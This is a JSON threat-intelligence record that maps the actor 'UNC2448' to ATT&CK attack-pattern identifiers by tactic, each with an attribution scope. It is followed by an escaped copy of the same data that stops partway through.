{
  "id": "threat-actor--f9b2aac3-c074-5ef2-bed2-d29e5e3740bc",
  "name": "UNC2448",
  "type": "actor-mitre",
  "attack-patterns": {
    "Impact": [
      {
        "id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
        "attribution_scope": "confirmed"
      }
    ],
    "Persistence": [
      {
        "id": "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--635cbe30-392d-4e27-978e-66774357c762",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Lateral Movement": [
      {
        "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Execution": [
      {
        "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Resource Development": [
      {
        "id": "attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1cec9319-743b-4840-bb65-431547bce82a",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Privilege Escalation": [
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Defense Evasion": [
      {
        "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Credential Access": [
      {
        "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
        "attribution_scope": "confirmed"
      }
    ],
    "Discovery": [
      {
        "id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
        "attribution_scope": "confirmed"
      }
    ],
    "Collection": [
      {
        "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f",
        "attribution_scope": "confirmed"
      }
    ],
    "Initial Access": [
      {
        "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
        "attribution_scope": "confirmed"
      }
    ],
    "Command and Control": [
      {
        "id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
        "attribution_scope": "confirmed"
      }
    ]
  },
  "is_publishable": true
}
"{\"threat-actors\": [{\"id\": \"threat-actor--f9b2aac3-c074-5ef2-bed2-d29e5e3740bc\", \"name\": \"UNC2448\", \"type\": \"actor-mitre\", \"attack-patterns\": {\"Impact\": [{\"id\": \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\", \"attribution_scope\": \"confirmed\"}], \"Persistence\": [{\"id\": \"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--635cbe30-392d-4e27-978e-66774357c762\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\", \"attribution_scope\": \"confirmed\"}]}], \"Lateral Movement\": [{\"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\", \"attribution_scope\": \"confirmed\"}]}], \"Execution\": [{\"id\": \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\", \"attribution_scope\": \"confirmed\"}]}], \"Resource Development\": [{\"id\": \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\", \"attribution_scope\": \"confirmed\"}]}], \"Privilege Escalation\": [{\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\", \"attribution_scope\": \"confirmed\"}]}], \"Defense Evasion\": [{\"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\", \"attribution_scope\": \"confirmed\"}]}], \"Credential Access\": [{\"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\", \"attribution_scope\": \"confirmed\"}], \"Discovery\": [{\"id\": \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\", \"attribution_scope\": \"confirmed\"}, {\"id\": 